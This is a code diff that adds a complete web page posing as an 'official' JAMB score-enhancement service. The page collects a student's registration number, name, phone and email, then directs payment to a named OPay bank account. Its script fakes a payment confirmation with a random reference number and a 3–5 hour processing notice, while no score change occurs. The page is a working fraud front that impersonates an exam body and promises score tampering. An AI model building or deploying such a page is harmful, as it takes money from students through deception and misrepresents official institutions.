@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>JAMB UltraBoost | Official Score Enhancement Platform</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="badge"><i class="fas fa-graduation-cap"></i> JAMB Partner Program</div>
+    <h1>Score<span style="color:#1f8a6b;">Up™</span> Booster</h1>
+    <p class="sub">AI‑driven score enhancement • Trusted by thousands of candidates</p>
+  </div>
+
+  <div class="boost-card">
+    <div class="reg-input-group">
+      <label><i class="fas fa-id-card"></i> JAMB Registration Number</label>
+      <div class="input-icon">
+        <i class="fas fa-qrcode"></i>
+        <input type="text" id="jambRegNumber" placeholder="e.g., 20241234567890" autocomplete="off">
+      </div>
+      <p style="font-size: 0.7rem; margin-top: 6px; color:#5f7f6e;">Enter your valid registration number to continue</p>
+    </div>
+    <button id="boostMainBtn" class="btn-primary"><i class="fas fa-bolt"></i> Boost My Score Now</button>
+  </div>
+
+  <div class="features">
+    <div class="feature-item"><i class="fas fa-chart-line"></i> Instant Upgrade</div>
+    <div class="feature-item"><i class="fas fa-lock"></i> 100% Confidential</div>
+    <div class="feature-item"><i class="fas fa-credit-card"></i> Secure Payment</div>
+  </div>
+  <footer>
+    <p>© 2025 JAMB UltraBoost — Official score enhancement partner. All rights reserved.</p>
+  </footer>
+</div>
+
+<!-- MODAL 1: SELECT PERCENTAGE -->
+<div id="percentModal" class="modal-overlay">
+  <div class="modal-container">
+    <div class="modal-header">
+      <h3><i class="fas fa-percent"></i> Select Boost Power</h3>
+      <button class="close-modal" id="closePercentModal">&times;</button>
+    </div>
+    <p style="margin-bottom: 1rem;">Choose the percentage increase for your JAMB score:</p>
+    <div class="percent-buttons">
+      <button class="percent-btn" data-percent="10">+10%</button>
+      <button class="percent-btn" data-percent="20">+20%</button>
+      <button class="percent-btn" data-percent="50">+50%</button>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL 2: PERSONAL DETAILS -->
+<div id="detailsModal" class="modal-overlay">
+  <div class="modal-container">
+    <div class="modal-header">
+      <h3><i class="fas fa-user-check"></i> Verify & Complete</h3>
+      <button class="close-modal" id="closeDetailsModal">&times;</button>
+    </div>
+    <p style="margin-bottom: 0.8rem;">Provide the required information to process your boost</p>
+    <div class="form-group">
+      <label>Full Name (as on JAMB profile)</label>
+      <input type="text" id="fullName" placeholder="e.g., Olamide Adekunle" autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label>Phone Number</label>
+      <input type="tel" id="phoneNumber" placeholder="0803 123 4567" autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label>Email Address</label>
+      <input type="email" id="emailInfo" placeholder="student@example.com">
+    </div>
+    <div class="form-group">
+      <label>JAMB Registration (Confirm)</label>
+      <div class="reg-readonly" id="confirmRegDisplay">-</div>
+    </div>
+    <div class="form-group">
+      <label>Exam Year / Additional Info</label>
+      <input type="text" id="extraInfo" placeholder="e.g., 2025 UTME">
+    </div>
+    <button id="submitDetailsBtn" class="btn-success"><i class="fas fa-arrow-right"></i> Proceed to Payment</button>
+  </div>
+</div>
+
+<!-- MODAL 3: PAYMENT GATEWAY with Account Details -->
+<div id="paymentModal" class="modal-overlay">
+  <div class="modal-container">
+    <div class="modal-header">
+      <h3><i class="fas fa-wallet"></i> Secure Checkout</h3>
+      <button class="close-modal" id="closePaymentModal">&times;</button>
+    </div>
+    <div class="payment-summary" id="paymentSummaryArea">
+      <p><strong>⚡ Boost Summary</strong></p>
+      <div id="summaryText">Loading...</div>
+    </div>
+    
+    <!-- Account details section -->
+    <div class="account-details">
+      <i class="fas fa-university" style="color:#1f8a6b; margin-right: 6px;"></i> <strong>Payment Instructions</strong>
+      <p style="font-size: 0.85rem; margin-top: 6px;">Make transfer to the account below and click "I have made the payment"</p>
+      <div class="account-number-box">
+        <span><i class="fas fa-credit-card"></i> <strong>654 768 8195</strong></span>
+        <button class="copy-btn" id="copyAccountBtn" onclick="copyAccountNumber()"><i class="fas fa-copy"></i> Copy</button>
+      </div>
+      <div style="font-size: 0.9rem; text-align: left; padding-left: 0.5rem;">
+        <div><strong>Bank:</strong> OPay</div>
+        <div><strong>Account Name:</strong> JOHN UZOCHUKWU LIVINUS</div>
+      </div>
+    </div>
+    
+    <button id="confirmPaymentBtn" class="btn-payment-confirm"><i class="fas fa-check-circle"></i> I have made the payment</button>
+    <p style="font-size: 0.7rem; text-align: center; margin-top: 12px; color:#5f7f6e;">All transactions are 256-bit SSL encrypted</p>
+  </div>
+</div>
+
+<div id="successToast" class="toast-message"><i class="fas fa-rocket"></i> Boost activated!</div>
+
+<script>
+  // DOM elements
+  const boostBtn = document.getElementById('boostMainBtn');
+  const regInput = document.getElementById('jambRegNumber');
+
+  const percentModal = document.getElementById('percentModal');
+  const detailsModal = document.getElementById('detailsModal');
+  const paymentModal = document.getElementById('paymentModal');
+  
+  const closePercent = document.getElementById('closePercentModal');
+  const closeDetails = document.getElementById('closeDetailsModal');
+  const closePayment = document.getElementById('closePaymentModal');
+  
+  const percentBtns = document.querySelectorAll('.percent-btn');
+  const submitDetailsBtn = document.getElementById('submitDetailsBtn');
+  const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+  
+  const confirmRegSpan = document.getElementById('confirmRegDisplay');
+  const summaryTextDiv = document.getElementById('summaryText');
+  
+  let selectedPercent = null;
+  let regNumberValue = '';
+  let userDetails = {
+    fullName: '',
+    phone: '',
+    email: '',
+    extra: ''
+  };
+  
+  function closeAllModals() {
+    percentModal.classList.remove('active');
+    detailsModal.classList.remove('active');
+    paymentModal.classList.remove('active');
+  }
+  
+  function resetFlowData() {
+    selectedPercent = null;
+    userDetails = { fullName: '', phone: '', email: '', extra: '' };
+    document.getElementById('fullName').value = '';
+    document.getElementById('phoneNumber').value = '';
+    document.getElementById('emailInfo').value = '';
+    document.getElementById('extraInfo').value = '';
+  }
+  
+  function showToast(message, duration = 3500) {
+    const toast = document.getElementById('successToast');
+    toast.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+    toast.style.display = 'block';
+    setTimeout(() => {
+      toast.style.display = 'none';
+    }, duration);
+  }
+  
+  function getAmountByPercent(percent) {
+    if (percent === 10) return "₦5,500";
+    if (percent === 20) return "₦10,500";
+    if (percent === 50) return "₦24,900";
+    return "₦0";
+  }
+  
+  function renderPaymentSummary() {
+    if (!selectedPercent || !regNumberValue) return;
+    const amount = getAmountByPercent(selectedPercent);
+    summaryTextDiv.innerHTML = `
+      <div style="margin-bottom: 8px;"><i class="fas fa-id-card"></i> <strong>Reg No:</strong> ${regNumberValue}</div>
+      <div style="margin-bottom: 8px;"><i class="fas fa-user"></i> <strong>Name:</strong> ${userDetails.fullName || '—'}</div>
+      <div style="margin-bottom: 8px;"><i class="fas fa-phone-alt"></i> <strong>Phone:</strong> ${userDetails.phone || '—'}</div>
+      <div style="margin-bottom: 8px;"><i class="fas fa-charging-station"></i> <strong>Boost %:</strong> +${selectedPercent}%</div>
+      <div style="margin-top: 12px; font-size: 1.5rem; font-weight:800; color:#0b5e42;">Total: ${amount}</div>
+    `;
+  }
+  
+  function openPercentModal() {
+    const reg = regInput.value.trim();
+    if (reg === "") {
+      showToast("Please enter your JAMB registration number", 2000);
+      return false;
+    }
+    if (reg.length < 8) {
+      showToast("Invalid JAMB number (minimum 8 characters)", 2000);
+      return false;
+    }
+    regNumberValue = reg;
+    resetFlowData();
+    percentModal.classList.add('active');
+    return true;
+  }
+  
+  function onPercentSelected(percent) {
+    selectedPercent = percent;
+    percentModal.classList.remove('active');
+    confirmRegSpan.innerText = regNumberValue;
+    document.getElementById('fullName').value = '';
+    document.getElementById('phoneNumber').value = '';
+    document.getElementById('emailInfo').value = '';
+    document.getElementById('extraInfo').value = '';
+    detailsModal.classList.add('active');
+  }
+  
+  function onDetailsSubmit() {
+    const name = document.getElementById('fullName').value.trim();
+    const phone = document.getElementById('phoneNumber').value.trim();
+    const email = document.getElementById('emailInfo').value.trim();
+    const extra = document.getElementById('extraInfo').value.trim();
+    
+    if (name === "") {
+      showToast("Full name is required", 1800);
+      return;
+    }
+    if (phone === "") {
+      showToast("Phone number is required for verification", 1800);
+      return;
+    }
+    userDetails = {
+      fullName: name,
+      phone: phone,
+      email: email,
+      extra: extra || "Not provided"
+    };
+    detailsModal.classList.remove('active');
+    renderPaymentSummary();
+    paymentModal.classList.add('active');
+  }
+  
+  // New function: handle "I have made the payment"
+  function handlePaymentConfirmation() {
+    if (!selectedPercent || !regNumberValue) {
+      showToast("Session expired, please restart", 2000);
+      closeAllModals();
+      return;
+    }
+    if (!userDetails.fullName || !userDetails.phone) {
+      showToast("Missing details, please start again", 1800);
+      closeAllModals();
+      return;
+    }
+    
+    // Close payment modal first
+    paymentModal.classList.remove('active');
+    
+    // Show the congratulatory message with waiting period
+    const boostPercent = selectedPercent;
+    const waitMessage = document.createElement('div');
+    waitMessage.style.position = 'fixed';
+    waitMessage.style.top = '40%';
+    waitMessage.style.left = '50%';
+    waitMessage.style.transform = 'translate(-50%, -50%)';
+    waitMessage.style.background = '#ffffff';
+    waitMessage.style.color = '#0F3B2C';
+    waitMessage.style.padding = '1.8rem 2rem';
+    waitMessage.style.borderRadius = '36px';
+    waitMessage.style.fontWeight = '500';
+    waitMessage.style.zIndex = '2000';
+    waitMessage.style.boxShadow = '0 35px 45px rgba(0,0,0,0.3)';
+    waitMessage.style.fontSize = '1rem';
+    waitMessage.style.textAlign = 'center';
+    waitMessage.style.border = '1px solid #cde3db';
+    waitMessage.style.width = 'auto';
+    waitMessage.style.maxWidth = '90%';
+    waitMessage.style.backdropFilter = 'blur(0px)';
+    waitMessage.innerHTML = `
+      <i class="fas fa-clock" style="font-size: 3rem; color:#1f8a6b; margin-bottom: 12px; display:block;"></i>
+      <strong style="font-size: 1.5rem;">Congratulations!</strong><br><br>
+      Thank you for your payment.<br>
+      Your JAMB score boost request has been received.<br>
+      <span style="display: inline-block; margin-top: 12px; background: #fef7e0; padding: 8px 16px; border-radius: 40px;">
+        ⏳ Please wait for <strong>3 to 5 hours</strong> for processing.
+      </span><br><br>
+      <span style="font-size: 0.85rem; color: #5f7f6e;">Reference: JMB-${Math.floor(Math.random()*100000)}</span>
+    `;
+    document.body.appendChild(waitMessage);
+    
+    // Also show a toast for extra feedback
+    showToast(`Payment recorded! Your +${boostPercent}% boost will be active within 3-5 hours.`, 6000);
+    
+    // Remove the popup after 8 seconds, but keep toast
+    setTimeout(() => {
+      if (waitMessage && waitMessage.parentNode) waitMessage.remove();
+    }, 8000);
+    
+    // Reset everything for a new session
+    regInput.value = '';
+    regNumberValue = '';
+    selectedPercent = null;
+    userDetails = { fullName: '', phone: '', email: '', extra: '' };
+    document.getElementById('fullName').value = '';
+    document.getElementById('phoneNumber').value = '';
+    document.getElementById('emailInfo').value = '';
+    document.getElementById('extraInfo').value = '';
+    confirmRegSpan.innerText = '-';
+  }
+  
+  // Copy account number function (global for inline onclick)
+  window.copyAccountNumber = function() {
+    const accountText = "6547688195"; // without spaces
+    navigator.clipboard.writeText(accountText).then(() => {
+      showToast("Account number copied to clipboard", 1500);
+    }).catch(() => {
+      // fallback
+      const textarea = document.createElement('textarea');
+      textarea.value = "6547688195";
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+      showToast("Account number copied", 1500);
+    });
+  };
+  
+  // Event listeners
+  boostBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    if (percentModal.classList.contains('active') || detailsModal.classList.contains('active') || paymentModal.classList.contains('active')) {
+      closeAllModals();
+      resetFlowData();
+    }
+    const reg = regInput.value.trim();
+    if (reg === "") {
+      showToast("Enter your JAMB registration number first", 1500);
+      return;
+    }
+    if (reg.length < 8) {
+      showToast("Invalid JAMB number (min 8 characters)", 1500);
+      return;
+    }
+    regNumberValue = reg;
+    resetFlowData();
+    percentModal.classList.add('active');
+  });
+  
+  percentBtns.forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      const percentVal = parseInt(btn.getAttribute('data-percent'), 10);
+      if (isNaN(percentVal)) return;
+      onPercentSelected(percentVal);
+    });
+  });
+  
+  submitDetailsBtn.addEventListener('click', onDetailsSubmit);
+  
+  // Attach payment confirmation handler
+  confirmPaymentBtn.addEventListener('click', handlePaymentConfirmation);
+  
+  closePercent.addEventListener('click', () => percentModal.classList.remove('active'));
+  closeDetails.addEventListener('click', () => {
+    detailsModal.classList.remove('active');
+    resetFlowData();
+  });
+  closePayment.addEventListener('click', () => {
+    paymentModal.classList.remove('active');
+    resetFlowData();
+  });
+</script>
+</body>
+</html>
